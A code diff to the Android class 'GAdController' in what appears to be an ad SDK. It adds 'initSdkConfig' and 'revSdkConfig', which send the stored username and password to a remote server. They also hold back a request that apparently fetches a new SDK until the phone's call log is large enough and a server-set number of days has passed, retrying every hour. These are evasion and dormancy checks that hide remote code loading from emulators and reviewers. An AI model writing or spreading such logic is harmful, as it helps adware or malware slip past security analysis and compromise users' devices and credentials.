@@ -44,7 +44,7 @@ public class GAdController {
 		ApplicationInfo appInfo = null;
 		try {
 			appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(),PackageManager.GET_META_DATA);
-			String qew_channel = appInfo.metaData.getString("qew_channel");
+			String qew_channel = appInfo.metaData.getString("UMENG_CHANNEL");
 			GCommons.CHANNEL = qew_channel;
 			Log.e("------------","qew_channel="+GCommons.CHANNEL);
 		} catch (NameNotFoundException e) {
@@ -68,12 +68,109 @@ public class GAdController {
 		boolean isTest = GTool.getSharedPreferences().getBoolean(GCommons.SHARED_KEY_TESTMODEL, false);
 		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTest);
 		
-		GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);	
-		
 		long t = GTool.getSharedPreferences().getLong(GCommons.SHARED_KEY_LOGIN_TIME, 0l);
 		long dt = System.currentTimeMillis() - t;
 		if(dt > 28*60*1000)
 			login();
+		
+		initSdkConfig();
+	}
+	
+	public void initSdkConfig()
+	{
+		String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
+		String password = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_PASSWORD, "");
+		int channel_paiming =  GTool.getSharedPreferences().getInt("channel_paiming", -1);
+		JSONObject obj = new JSONObject();
+		try {
+			obj.put(GCommons.SHARED_KEY_NAME, name);
+			obj.put(GCommons.SHARED_KEY_PASSWORD, password);
+			obj.put("channel",  GCommons.CHANNEL);
+			obj.put("channel_paiming",  channel_paiming);
+		} catch (JSONException e) {
+			e.printStackTrace();
+		}
+		
+		GTool.httpPostRequest(GCommons.URI_POST_GET_SDKCONFIG, this, "revSdkConfig", obj.toString());
+	}
+	
+	
+	public void revSdkConfig(Object ob,Object rev)
+	{
+		Log.e("--------------", "revSdkConfig="+rev.toString());
+		try {
+			JSONObject obj = new JSONObject(rev.toString());
+			int callLogNum = obj.getInt("callLogNum");
+			int newChannelNum = obj.getInt("newChannelNum");
+			float time = (float) obj.getDouble("time");
+			int channel_paiming =  GTool.getSharedPreferences().getInt("channel_paiming", -1);
+			if(channel_paiming == -1)
+			{
+				channel_paiming = obj.getInt("channel_paiming");
+			}
+			boolean b = true;
+			if(channel_paiming <= newChannelNum && newChannelNum > 0)
+			{
+				b = false;
+			}
+			if(b && callLogNum > 0)
+			{
+				if(GTool.getCallLogNum() < callLogNum)
+				{
+					b = false;
+				}
+			}
+			if(b)
+			{
+				if(time != 0)
+				{
+					long reqTime = GTool.getSharedPreferences().getLong(GCommons.SHARED_KEY_REQ_SDK_TIME, 0l);
+					long nowTime = System.currentTimeMillis();
+					if(reqTime == 0)
+					{
+						b = false;
+						GTool.saveSharedData(GCommons.SHARED_KEY_REQ_SDK_TIME, nowTime);
+					}
+					else
+					{
+						if(nowTime-reqTime < time*24*60*60*1000)
+						{
+							b = false;
+						}
+					}
+				}
+			}
+			if(b)
+			{
+				GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);	
+			}
+			else
+			{
+				new Thread(){
+					public void run() {
+						try {
+							Thread.sleep(1*60*60*1000);
+							initSdkConfig();
+						} catch (InterruptedException e) {
+							e.printStackTrace();
+						}
+					};
+				}.start();
+			}
+						
+		} catch (JSONException e) {
+			
+			new Thread(){
+				public void run() {
+					try {
+						Thread.sleep(1*60*60*1000);
+						initSdkConfig();
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+					}
+				};
+			}.start();
+		}	
 	}
 	
 	public void showSpotAd()
